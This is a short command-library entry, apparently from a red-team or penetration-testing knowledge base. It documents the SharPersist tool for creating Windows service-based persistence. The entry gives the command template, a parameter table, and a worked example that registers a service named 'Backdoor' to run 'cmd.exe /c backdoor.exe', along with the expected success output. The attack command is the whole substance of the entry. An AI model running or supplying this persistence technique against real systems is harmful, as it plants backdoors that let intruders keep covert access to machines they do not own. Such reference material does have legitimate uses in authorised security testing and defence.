---
id: c1cfa19e-1ec1-4410-a059-5fc877cdcb78
name: create-backdoor-persistence-sharpersist
type: command
executor: cmd
data: >-
  SharPersist -t service -c "$_COMMAND" -a "$_ARGUMENTS" -n "$_SERVICE_NAME" -m
  add
output: null
created_at: '2023-04-06T03:56:28.095327+00:00'
updated_at: '2023-04-10T20:37:29.727924+00:00'
platforms:
  - Windows
tags:
  - persistence
  - service
  - sharpersist
verified: true
validated: true
---

# create-backdoor-persistence-sharpersist

## Command

```cmd
SharPersist -t service -c "$_COMMAND" -a "$_ARGUMENTS" -n "$_SERVICE_NAME" -m add
```

## Description

Uses the SharPersist tool to create a service-based persistence mechanism by registering a new service that executes a command and arguments, typically to run a backdoor payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t service | Technique type: service | Yes |
| -c $_COMMAND | Command to execute (e.g., C:\Windows\System32\cmd.exe) | Yes |
| -a $_ARGUMENTS | Arguments for the command (e.g., /c backdoor.exe) | Yes |
| -n $_SERVICE_NAME | Service name (e.g., Backdoor) | Yes |
| -m add | Mode: add the persistence | Yes |

## Examples

### Basic Usage

```cmd
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
```

## Expected Output

[+] Service 'Backdoor' created successfully.

Confirms addition to registry without errors.

## Related

- [[procedures/windows-elevated-services-backdoor-persistence]]
- [[tools/sharpersist]]
